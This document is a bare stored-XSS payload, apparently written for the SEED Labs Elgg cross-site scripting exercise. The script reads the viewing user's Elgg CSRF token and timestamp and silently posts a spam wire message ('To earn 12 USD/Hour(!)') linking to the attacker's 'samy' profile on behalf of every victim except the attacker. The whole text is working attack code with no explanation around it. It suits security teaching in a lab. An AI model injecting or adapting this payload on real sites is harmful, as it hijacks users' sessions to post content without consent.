<script type="text/javascript">
  window.onload = function(){
    if (typeof elgg !== 'undefined'){
		if(elgg.security && elgg.security.token) {
		    var ts = elgg.security.token.__elgg_ts;
            var token = elgg.security.token.__elgg_token;
            
            var sendurl = "http://www.seed-server.com/action/thewire/add"; 
            
            var message = "To earn 12 USD/Hour(!), visit now\n";
            message = message + encodeURIComponent("http://www.seed-server.com/profile/samy") ;
            
            var content =  "__elgg_token=" + token;
            content = content +"&__elgg_ts=";
            content = content  + ts +"&body="+message;

            var myID = 59; 
            var loggedInUserId = elgg.session.user.guid; 
            
            
            if(loggedInUserId !== myID){
                var Ajax = new XMLHttpRequest();
                Ajax.open("POST", sendurl, true);
                Ajax.setRequestHeader("Host", "www.seed-server.com");
                Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                Ajax.send(content);
	        }
        }
    }
}

</script>